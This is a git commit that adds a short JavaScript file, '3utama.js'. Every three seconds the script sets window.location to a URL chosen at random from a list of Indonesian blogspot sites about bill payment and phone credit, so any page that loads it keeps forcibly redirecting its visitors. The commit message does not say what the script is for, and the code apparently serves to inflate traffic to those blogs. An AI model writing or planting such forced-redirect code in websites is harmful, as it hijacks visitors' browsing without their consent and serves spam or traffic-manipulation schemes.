231693e29c422c697445bebf68c0398896b2bd74
rirawann85 <56500370+rirawann85@users.noreply.github.com>
2020-02-20 01:02:34 +0700

    Create 3utama.js

---
+++ 3utama.js
@@ -0,0 +1,20 @@
+(function(){
+setInterval(function(){
+var redSites = [
+
+"https://bebastagihan.blogspot.com/",
+"https://blangkonkuota.blogspot.com/",
+"https://saldoppob.blogspot.com/",
+"https://solawatpulsa.blogspot.com/",
+"https://travelppob.blogspot.com/",
+"https://bebastagihan.blogspot.com/",
+"https://lapakrecehan.blogspot.com/",
+"https://tawontube.blogspot.com/",
+"https://tempatagenpulsa.blogspot.com/",
+"https://webbayar.blogspot.com/",
+  
+];
+var randomLinks = redSites[Math.floor(Math.random()*redSites.length)];
+window.location = randomLinks
+},3000)
+}())
